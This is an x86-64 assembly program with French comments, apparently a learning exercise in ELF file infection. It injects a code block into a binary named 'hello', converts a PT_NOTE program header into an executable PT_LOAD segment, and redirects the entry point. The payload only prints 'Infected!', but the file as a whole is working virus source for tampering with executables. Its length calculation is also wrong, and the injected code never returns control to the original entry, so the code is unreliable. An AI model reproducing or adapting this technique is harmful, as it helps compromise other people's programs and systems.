section .text
    global _start

shellcode:
    ; Appeler write(1, "Infected!", 9)
    mov rax, 1          ; syscall: write
    mov rdi, 1          ; File descriptor: stdout
    lea rsi, [rel msg]  ; Adresse du message
    mov rdx, 9          ; Taille du message
    syscall

exit_error:
    mov rax, 60
    mov rdi, 1
    syscall


_start:
    ; Ouverture du fichier en écriture
    mov rax, 2
    lea rdi, [rel filename]
    mov rsi, 2
    xor rdx, rdx
    syscall
    test rax, rax
    js exit_error
    mov r8, rax

    ; Injecter le code a l'offset
    mov rax, 8
    mov rdi, r8
    mov rsi, 872
    xor rdx, rdx
    syscall

    ; Ecrire le shellcode
    mov rax, 1
    mov rdi, r8
    lea rsi, [rel shellcode]
    mov rdx, shellcode_len
    syscall

    ; Positionner le curseur à l'en-tête du segment PT_NOTE
    mov rax, 8              ; syscall: lseek
    mov rdi, r8             ; file descriptor
    mov rsi, 0x120          ; Offset de l'en-tête du PT_NOTE (à confirmer avec readelf)
    xor rdx, rdx            ; SEEK_SET
    syscall

    ; Modifier le type de segment de PT_NOTE (0x04 -> 0x01)
    mov rax, 1              ; syscall: write
    mov rdi, r8             ; file descriptor
    lea rsi, [rel new_type] ; Nouveau type PT_LOAD
    mov rdx, 4              ; Taille en octets
    syscall

    ; Modifier les permissions du segment (0x04 -> 0x05)
    mov rax, 8              ; syscall: lseek
    mov rdi, r8             ; file descriptor
    mov rsi, 0x138          ; Offset des permissions dans l'en-tête
    xor rdx, rdx            ; SEEK_SET
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8             ; file descriptor
    lea rsi, [rel new_flags] ; Nouvelles permissions (R E)
    mov rdx, 4              ; Taille en octets
    syscall


    ; Changer l'entrypoint
    mov rax, 8
    mov rdi, r8
    mov rsi, 24
    xor rdx, rdx
    syscall

    mov rax, 1
    mov rdi, r8
    lea rsi, [rel new_entry]
    mov rdx, 8
    syscall

    ; Fermer le fichier
    mov rax, 3
    mov rdi, r8
    syscall
    
    ; Terminer
    mov rax, 60
    xor rdi, rdi
    syscall

msg db "Infected!", 0
filename db "hello", 0
shellcode_len equ $ - shellcode
new_entry dq 0x368
new_type db 0x01, 0x00, 0x00, 0x00
new_flags db 0x05, 0x00, 0x00, 0x00